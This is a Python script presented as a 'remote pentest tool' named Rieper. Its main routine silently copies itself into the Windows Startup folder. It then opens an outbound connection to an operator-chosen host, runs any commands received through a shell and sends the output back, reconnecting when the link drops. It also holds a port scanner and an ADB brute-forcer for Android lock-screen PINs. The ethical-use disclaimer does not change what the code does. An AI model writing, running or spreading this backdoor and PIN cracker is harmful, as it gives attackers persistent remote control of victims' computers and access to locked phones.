import socket
import subprocess
import time
import os
import webbrowser
from sys import platform
from itertools import product

# Cores ANSI
RED = "\033[1;31m"
GREEN = "\033[1;32m"
YELLOW = "\033[1;33m"
CYAN = "\033[1;36m"
RESET = "\033[0m"

# Configurações globais
TIKTOK_PROFILE = "https://www.tiktok.com/@sullyzni?_t=ZS-8xyUhhC3SdN&_r=1"
PIN_LENGTH = 4  # Para PIN de 4 dígitos
MAX_ATTEMPTS = 100  # Limite de tentativas
DELAY = 1  # Atraso entre tentativas (evita bloqueio)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def autorun():
    try:
        filen = os.path.basename(__file__)
        exe_file = filen.replace(".py", ".exe")
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        if os.path.exists(exe_file):
            os.system(f'copy "{exe_file}" "{startup}"')
            print(f"{GREEN}[+] Added to startup{RESET}")
    except Exception as e:
        print(f"{RED}[!] Autostart Error: {e}{RESET}")

def show_banner():
    print(f"""{RED}
    ██████╗ ██╗███████╗██████╗ ███████╗██████╗
    ██╔══██╗██║██╔════╝██╔══██╗██╔════╝██╔══██╗
    ██████╔╝██║█████╗  ██████╔╝█████╗  ██████╔╝
    ██╔══██╗██║██╔══╝  ██╔═══╝ ██╔══╝  ██╔══██╗
    ██║  ██║██║███████╗██║     ███████╗██║  ██║
    ╚═╝  ╚═╝╚═╝╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝
    {CYAN}REMOTE PENTEST TOOL v3.0 | By: @sullyzni{RESET}
    """)

def menu_principal():
    print(f"""
    {GREEN}[1]{RESET} Connect to Target
    {GREEN}[2]{RESET} Developer Tools
    {GREEN}[3]{RESET} About Rieper
    {GREEN}[4]{RESET} Exit
    """)

def about_rieper():
    clear_screen()
    print(f"""{RED}
    ██████╗ ██████╗  ██████╗ ██╗   ██╗████████╗
    ██╔══██╗██╔══██╗██╔═══██╗██║   ██║╚══██╔══╝
    ██████╔╝██████╔╝██║   ██║██║   ██║   ██║   
    ██╔══██╗██╔══██╗██║   ██║██║   ██║   ██║   
    ██║  ██║██████╔╝╚██████╔╝╚██████╔╝   ██║   
    ╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝    ╚═╝{RESET}""")
    
    print(f"""
    {CYAN}Developer:{RESET} {YELLOW}@sullyzni{RESET}
    {CYAN}TikTok:{RESET} {GREEN}{TIKTOK_PROFILE}{RESET}
    
    {RED}Purpose:{RESET}
    - Ethical penetration testing tool
    - Educational/research use only
    
    {RED}Warning:{RESET}
    Unauthorized access to computer systems is illegal.
    Use only on networks you own or have permission to test.
    """)
    
    if input(f"\n{YELLOW}Open TikTok profile? (y/n): {RESET}").lower() == 'y':
        webbrowser.open(TIKTOK_PROFILE)
    input("\nPress Enter to return...")

def brute_force_pin():
    print(f"\n{RED}[!] Starting brute force for {PIN_LENGTH}-digit PIN{RESET}")
    
    attempts = 0
    
    for pin in product('0123456789', repeat=PIN_LENGTH):
        pin_str = ''.join(pin)
        attempts += 1
        
        print(f"{YELLOW}Trying PIN: {pin_str}{RESET}", end='\r')
        
        # Comando ADB para simular entrada (requer USB Debugging)
        command = f"adb shell input text {pin_str} && adb shell input keyevent 66"
        
        try:
            subprocess.run(command, shell=True, check=True, timeout=2)
            time.sleep(DELAY)
            
            # Verifica se o dispositivo ainda está bloqueado
            lock_status = subprocess.check_output("adb shell dumpsys window | grep mDreamingLockscreen", 
                                                shell=True).decode()
            
            if "mDreamingLockscreen=false" in lock_status:
                print(f"\n{GREEN}[+] PIN FOUND: {pin_str} (in {attempts} attempts){RESET}")
                return pin_str
                
        except subprocess.TimeoutExpired:
            print(f"{RED}[-] Timeout - Check USB connection{RESET}")
            break
        except Exception as e:
            print(f"{RED}[-] Error: {str(e)}{RESET}")
            continue
    
    print(f"\n{RED}[-] PIN not found in {MAX_ATTEMPTS} attempts{RESET}")
    return None

def developer_tools():
    while True:
        clear_screen()
        print(f"""{RED}
    ██████╗ ███████╗██╗   ██╗███████╗██╗      ██████╗ ██████╗ ███████╗
    ██╔══██╗██╔════╝██║   ██║██╔════╝██║     ██╔═══██╗██╔══██╗██╔════╝
    ██║  ██║█████╗  ██║   ██║█████╗  ██║     ██║   ██║██████╔╝███████╗
    ██║  ██║██╔══╝  ╚██╗ ██╔╝██╔══╝  ██║     ██║   ██║██╔═══╝ ╚════██║
    ██████╔╝███████╗ ╚████╔╝ ███████╗███████╗╚██████╔╝██║     ███████║
    ╚═════╝ ╚══════╝  ╚═══╝  ╚══════╝╚══════╝ ╚═════╝ ╚═╝     ╚══════╝{RESET}
        """)
        
        print(f"""
    {GREEN}[1]{RESET} Port Scanner
    {GREEN}[2]{RESET} Vulnerability Check
    {GREEN}[3]{RESET} Brute Force PIN (Android)
    {GREEN}[4]{RESET} Back to Main Menu
        """)

        choice = input(f"{YELLOW}Select tool [1-4]: {RESET}").strip()

        if choice == "1":
            ip = input(f"\n{CYAN}Target IP (ex: 127.0.0.1): {RESET}").strip()
            port_range = input(f"{CYAN}Port range (ex: 1-100 or 22,80,443): {RESET}").strip() or "1-100"
            
            try:
                if "-" in port_range:
                    start, end = map(int, port_range.split("-"))
                    ports = range(start, end + 1)
                else:
                    ports = list(map(int, port_range.split(",")))
                
                print(f"\n{RED}=== SCANNING STARTED ==={RESET}")
                open_ports = []
                for port in ports:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(1)
                            if s.connect_ex((ip, port)) == 0:
                                service = socket.getservbyport(port) if port <= 65535 else "Unknown"
                                print(f"{GREEN}[+] Port {port} ({service}) - OPEN{RESET}")
                                open_ports.append(port)
                            else:
                                print(f"{RED}[-] Port {port} - CLOSED{RESET}")
                    except Exception as e:
                        print(f"{YELLOW}[!] Port {port} error: {str(e)}{RESET}")
                
                print(f"\n{CYAN}=== SCAN COMPLETE ==={RESET}")
                print(f"{GREEN}Open ports: {open_ports}{RESET}")
            
            except Exception as e:
                print(f"{RED}ERROR: {str(e)}{RESET}")
            
            input("\nPress Enter to continue...")

        elif choice == "2":
            ip = input(f"\n{CYAN}Target IP (ex: 127.0.0.1): {RESET}").strip()
            print(f"\n{RED}=== VULNERABILITY CHECK ==={RESET}")
            
            common_ports = {
                21: "FTP (Anonymous login possible)",
                22: "SSH (Brute-force vulnerable)",
                80: "HTTP (Check for SQLi/XSS)",
                443: "HTTPS (Check SSL certificates)",
                3389: "RDP (BlueKeep vulnerability)"
            }
            
            for port, vuln in common_ports.items():
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1)
                        if s.connect_ex((ip, port)) == 0:
                            print(f"{YELLOW}[!] {vuln}{RESET}")
                        else:
                            print(f"{CYAN}[+] Port {port} - No vulnerabilities detected{RESET}")
                except:
                    print(f"{RED}[-] Port {port} - Scan failed{RESET}")
            
            input("\nPress Enter to continue...")

        elif choice == "3":
            if input(f"{RED}[?] Confirm brute force on YOUR device? (y/n): {RESET}").lower() == 'y':
                brute_force_pin()
            input("\nPress Enter to continue...")

        elif choice == "4":
            break

        else:
            print(f"\n{RED}Invalid option!{RESET}")
            time.sleep(1)

def get_ip_port():
    print(f"\n    {RED}╔════════════════════════════════════════╗")
    print("    ║       SERVER CONNECTION               ║")
    print("    ╚════════════════════════════════════════╝{RESET}")
    while True:
        ip = input("\n    [+] Server IP (e.g. 192.168.1.1): ").strip()
        if not ip:
            print(f"    {RED}[!] Error: IP required!{RESET}")
            continue
        
        parts = ip.split('.')
        if len(parts) != 4 or not all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
            print(f"    {RED}[!] Invalid IP format!{RESET}")
            continue
        
        port = input("    [+] Server Port (default 443): ").strip()
        if not port:
            port = 443
        else:
            try:
                port = int(port)
                if not 1 <= port <= 65535:
                    raise ValueError
            except ValueError:
                print(f"    {RED}[!] Invalid port (1-65535){RESET}")
                continue
        
        return ip, port

def conn(ip, port):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10)
        client.connect((ip, port))
        print(f"\n{RED}[+] Connected to {ip}:{port}{RESET}")
        return client
    except Exception as error:
        print(f"\n{RED}[!] Connection Error: {error}{RESET}")
        return None

def cmd(client, data):
    try:
        if data.lower() in ('exit', 'quit'):
            client.send("Session terminated\n".encode('utf-8'))
            return False
            
        proc = subprocess.Popen(data, shell=True, 
                             stdin=subprocess.PIPE, 
                             stderr=subprocess.PIPE, 
                             stdout=subprocess.PIPE)
        output = proc.stdout.read() + proc.stderr.read()
        client.send(output + b"\n")
        return True
    except Exception as error:
        print(f"{RED}Command Error: {error}{RESET}")
        return False

def cli(client):
    try:
        while True:
            try:
                data = client.recv(1024).decode().strip()
                if not data:
                    break
                    
                if data == "/:kill":
                    print(f"{RED}[!] Kill command received{RESET}")
                    return False
                else:
                    if not cmd(client, data):
                        return False
            except socket.timeout:
                continue
            except Exception as e:
                print(f"{RED}Client Error: {e}{RESET}")
                break
        return True
    except Exception as error:
        print(f"{RED}Fatal Error: {error}{RESET}")
        client.close()
        return False

def main():
    autorun()
    while True:
        clear_screen()
        show_banner()
        menu_principal()
        
        choice = input(f"{YELLOW}Select option [1-4]: {RESET}").strip()
        
        if choice == "1":
            ip, port = get_ip_port()
            client = None
            while True:
                if not client:
                    print(f"\n{RED}[~] Connecting to {ip}:{port}...{RESET}")
                    client = conn(ip, port)
                
                if client:
                    if not cli(client):
                        client.close()
                        client = None
                        print(f"{RED}[~] Reconnecting in 5s...{RESET}")
                        time.sleep(5)
                else:
                    time.sleep(5)
        
        elif choice == "2":
            developer_tools()
        
        elif choice == "3":
            about_rieper()
        
        elif choice == "4":
            print(f"\n{RED}Shutting down Rieper...{RESET}")
            break
            
        else:
            print(f"\n{RED}Invalid option!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()